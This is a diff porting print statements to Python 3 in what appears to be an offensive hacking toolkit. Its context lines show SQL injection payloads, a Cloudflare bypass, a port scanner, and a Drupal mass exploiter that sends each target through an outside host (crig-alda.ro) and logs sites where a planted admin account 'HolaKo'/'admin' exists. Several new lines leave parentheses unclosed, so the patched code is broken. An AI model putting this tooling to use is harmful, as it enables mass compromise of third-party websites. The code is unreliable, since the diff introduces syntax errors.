@@ -1651,7 +1651,7 @@ class Fscan:
         (you can use medusa or hydra)
         '''
         clearScr()
-        print "[~] Grabbing Users"
+        print("[~] Grabbing Users")
         userslist = []
         for site1 in self.sites:
             try:
@@ -1687,7 +1687,7 @@ class Fscan:
         method from a guy in madleets
         '''
         clearScr()
-        print "[~] Bypassing cloudflare"
+        print("[~] Bypassing cloudflare")
         subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
         for site in self.sites:
             site.replace('http://', '')
@@ -1702,7 +1702,7 @@ class Fscan:
                 try:
                     ddd = socket.gethostbyname(doo)
                     if ddd != ip:
-                        print ' [*] Cloudflare bypassed -> ', ddd
+                        print(' [*] Cloudflare bypassed -> ', ddd)
                         break
                 except socket.error:
                     pass
@@ -1754,7 +1754,7 @@ class Fscan:
         tool in my blog
         '''
         clearScr()
-        print "[~] Checking SQL injection"
+        print("[~] Checking SQL injection")
         payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                     "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
         check = re.compile(
@@ -1780,7 +1780,7 @@ class Fscan:
         or with common ports (al-swisre idea)
         '''
         clearScr()
-        print "[~] Scanning Ports"
+        print("[~] Scanning Ports")
 
         if mode == 1:
             a = ran.split('-')
@@ -1798,7 +1798,7 @@ def do_it(ip, port):
 
     sock = sock.connect_ex((ip, port))
     if sock == 0:
-        print " [*] Port %i is open" % port
+        print(" [*] Port %i is open" % port)
 
 
 ############################
@@ -1831,22 +1831,22 @@ def drupal():
                 urlpa = urlparse(url)
                 site = urlpa.netloc
 
-                print "[+] Testing At " + site
+                print("[+] Testing At " + site)
                 resp = urllib2.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User: HolaKo" in read:
-                    print "Exploit found =>" + site
+                    print("Exploit found =>" + site)
 
-                    print "user:HolaKo\npass:admin"
+                    print("user:HolaKo\npass:admin")
                     a = open('up.txt', 'a')
                     a.write(site + '\n')
                     a.write("user:" + user + "\npass:" + pwd + "\n")
                 else:
-                    print "[-] Expl Not Found:( "
+                    print("[-] Expl Not Found:( ")
 
             except Exception as ex:
-                print ex
+                print(ex)
                 sys.exit(0)
 
         # Drupal Server ExtraCtor
@@ -1870,7 +1870,7 @@ def getdrupal():
             split = urlparse(url)
             site = split.netloc
             if site not in sites:
-                print site
+                print(site)
                 sites.append(site)
 
         # Drupal Mass List Exploiter
@@ -1887,16 +1887,16 @@ def drupallist():
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
-                print "[+]Success =>" + url
-                print "[-]username:HolaKo\n[-]password:admin"
+                print("[+]Success =>" + url)
+                print("[-]username:HolaKo\n[-]password:admin")
                 save = open('drupal.txt', 'a')
                 save.write(
                     url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
 
             else:
-                print i + "=> exploit not found "
+                print(i + "=> exploit not found ")
         except Exception as ex:
-            print ex
+            print(ex)
 
 
 def maine():
@@ -2149,32 +2149,31 @@ def wpminiscanner():
     wpeasyupload = check_wpeasyupload(sites)
     wpsymposium = check_wpsymposium(sites)
     for ss in wordpress:
-        print ss
-    print '[*] Found, ', len(wordpress), ' wordpress sites.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wordpress), ' wordpress sites.')
+    print('-' * 30 + '\n')
     for ss in wpstorethemeremotefileupload:
-        print ss
-    print '[*] Found, ', len(
-        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.')
+    print('-' * 30 + '\n')
     for ss in wpcontactcreativeform:
-        print ss
-    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
-    print '-' * 30 + '\n'
+        print(ss
+    print('[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.')
+    print('-' * 30 + '\n')
     for ss in wplazyseoplugin:
-        print ss
-    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
+    print('-' * 30 + '\n')
     for ss in wpeasyupload:
-        print ss
-    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss
+    print('[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.')
+    print('-' * 30 + '\n'
     for ss in wpsymposium:
-        print ss
+        print(ss)
 
-    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'
+    print('[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.')
 
-    print '\n'
+    print('\n')
 ############################
 
 
